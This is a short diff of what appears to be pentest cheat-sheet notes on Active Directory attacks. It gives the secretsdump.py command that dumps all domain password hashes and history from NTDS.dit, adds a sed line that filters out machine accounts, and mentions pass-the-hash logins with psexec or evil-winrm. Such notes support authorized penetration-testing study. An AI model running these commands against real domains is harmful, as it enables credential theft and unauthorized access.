@@ -9,7 +9,8 @@ If you have creds for the backup account for domain controller: can dump all has
     
 Use secretsdump.py to dump hashes and hash history from Active Directory database (NTDS.dit) and the SYSTEM registry hive. Password history can be helpful for password reuse attacks.            
 
-    python3 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL -outputfile dc-hashes -history
+    python3 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL -outputfile dc-hashes -history     
+    sed -i '/$:/d' dc-hashes.ntds     #remove machine accounts (end with $:)     
     
 Pass the Hash: use psexec or evil-winrm to login with username/ hash (doesn't need to be cracked)    
 
